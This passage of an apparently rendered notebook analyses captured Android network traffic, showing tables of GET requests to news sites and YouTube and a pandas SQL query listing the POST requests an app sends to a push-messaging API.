      <td> /__utm.gif?utmwv=5.4.6dc&amp;utms=1&amp;utmn=1807714930&amp;utmhn=www.sueddeutsche.de&amp;utme=8(Vermarktbar*Thema*Ressort*Dokumenttyp*URL)9(y*unfall*muenchen*artikel*http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=479x710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=M%C3%BCnchen-Haidhausen%20-%20Zehn%20Meter%20tiefes%20Loch%20im%20Gehweg%20-%20M%C3%BCnchen%20-%20S%C3%BCddeutsche.de&amp;utmhid=725159496&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;utmp=%2Fnachrichten_mobile%2Fmuenchen%2Fthema%2Funfall%2Fartikel%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg&amp;utmht=1390050886104&amp;utmac=UA-19474199-2&amp;utmcc=__utma%3D6611437.1403719128.1390050886.1390050886.1390050886.1%3B%2B__utmz%3D6611437.1390050886.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral...</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>200</th>
      <td>  28309</td>
      <td>  195.246.160.36</td>
      <td>                      www.hr-online.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /servlet/de.hr.cms.servlet.IMS?enc=d3M9aHJteXNxbCZibG9iSWQ9MTg3NTgyMTQmaWQ9NTA1OTg2ODU_</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>201</th>
      <td> 103826</td>
      <td>    83.223.85.61</td>
      <td>              www.neues-deutschland.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /img/t/86771</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>202</th>
      <td>   9514</td>
      <td>    2.23.186.240</td>
      <td>                     www.tagesschau.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /resources/framework/css/fonts/TheSans_LT_TT5_.svg</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>203</th>
      <td>   9529</td>
      <td>    2.23.186.240</td>
      <td>                     www.tagesschau.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /resources/framework/css/fonts/TheSans_LT_TT5i.svg</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>204</th>
      <td>   9521</td>
      <td>    2.23.186.240</td>
      <td>                     www.tagesschau.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /resources/framework/css/fonts/TheSans_LT_TT7_.svg</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>205</th>
      <td>  94881</td>
      <td>   193.104.220.6</td>
      <td>                            www.taz.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           /Essay-zur-Zuwanderung-aus-Osteuropa/!131209/</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>206</th>
      <td>  95323</td>
      <td>   193.104.220.6</td>
      <td>                            www.taz.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /Essay-zur-Zuwanderung-aus-Osteuropa/!131209;m/</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>207</th>
      <td>  95594</td>
      <td>   193.104.220.6</td>
      <td>                            www.taz.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /digitaz/cntres/szmmobil_Debatte-Artikel/ecnt/4702537358.taz/countergif</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>208</th>
      <td>  98714</td>
      <td>   185.31.17.185</td>
      <td>                      www.theverge.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /rss/index.xml</td>
      <td>                                                                                                                                                                                                              Ultimate DayDream</td>
    </tr>
    <tr>
      <th>209</th>
      <td>  62133</td>
      <td>  173.194.70.136</td>
      <td>              www.youtube-nocookie.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /device_204?app_anon_id=6988a4be-80bf-4a77-9581-f98c234a176f&amp;firstactive=1389027600&amp;firstactivegeo=DE&amp;firstlogin=1389027600&amp;prevactive=1390003200&amp;prevlogin=1390003200&amp;loginstate=1&amp;cplatform=mobile&amp;c=android&amp;cver=5.3.32&amp;cos=Android&amp;cosver=4.3.1&amp;cbr=com.google.android.youtube&amp;cbrver=5.3.32&amp;cbrand=samsung&amp;cmodel=GT-N7000&amp;cnetwork=o2%20-%20de</td>
      <td>                                                                                                                                       com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>210</th>
      <td>  62049</td>
      <td> 173.194.116.167</td>
      <td>                       www.youtube.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /leanback_ajax?action_environment=1</td>
      <td>                                                                                                                                  com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I) gzip</td>
    </tr>
    <tr>
      <th>211</th>
      <td>  64130</td>
      <td> 173.194.116.167</td>
      <td>                       www.youtube.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /ptracking?ptk=KontorRecords&amp;video_id=GoYrjCkN3Q4&amp;ptchn=b3tJ5NKw7mDxyaQ73mwbRg&amp;plid=AATwQoLNVKjFDu_5&amp;oid=SqRrmZwFybZNrAc1Oh_HdQ&amp;pltype=content</td>
      <td>                                                                                                                                       com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>212</th>
      <td>  73978</td>
      <td>  54.240.184.218</td>
      <td>                  xtra2.gpsonextra.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /xtra.bin</td>
      <td>                                                                                                                                                                                                                        Android</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h2 id="post-requests">POST Requests</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p3 = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT h.frame_number, d.dns_query, h.request_uri, h.data, h.text FROM http AS  h
    JOIN dns AS d ON h.ip_dst = d.dns_response
    WHERE lower(h.request_method) == &#39;post&#39;
    ORDER by h.ip_dst    
&#34;&#34;&#34;, con)
p3.head(500)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>frame_number</th>
      <th>dns_query</th>
      <th>request_uri</th>
      <th>data</th>
      <th>text</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>1  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>2  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>3  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>4  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>5  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>6  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>7  </th>
      <td> 25716</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32971737, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>8  </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>9  </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>10 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>11 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>12 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>13 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>14 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>15 </th>
      <td> 25724</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"1119413a297389c129790915258b4825171","timestamp":13900538708,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"fdfc1bbba1ab6eb97a59e08c49e3271a"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32972126, TSecr 191668474,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>16 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>17 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>18 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>19 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>20 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>21 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>22 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>23 </th>
      <td> 25833</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td>                                                                                                                        {"action":"getServerTime","auth":{"random":"ca3318438b295ab61a34b2a10b960a1c682","timestamp":13900538811,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"364989804263bd8af6146c078eed4850"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                     No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973358, TSecr 191670484,POST /api/ HTTP/1.1\r\n,\r\n,HTTP request 1/1</td>
    </tr>
    <tr>
      <th>24 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>25 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>26 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>27 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>28 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>29 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
    </tr>
    <tr>
      <th>30 </th>
      <td> 25868</td>
      <td>    saas.appoxee.com</td>
      <td>               /api/</td>
      <td> {"action":"getDeviceMessages","getDeviceMessages":{"queryType":"Regular","latestMessageDate":"2014-01-18T12:51:31.836","key":"19ba7bd21bb3cfa3"},"auth":{"random":"851868430692926395b96bcc6c62b869916","timestamp":13900538825,"AppSDKKey":"3ec0fb21-759c-4169-9fed-44efda1ea246","signature":"c5881a2819930f43af0b88c8c0f83c05"}}</td>
      <td>                                                                                                                                                                                                                                                                                                                                                             No-Operation (NOP),No-Operation (NOP),Timestamps: TSval 32973422, TSecr 191670577,POST /api/ HTTP/1.1\r\n,Cookie2: $Version=1\r\n,\r\n,HTTP request 2/2</td>
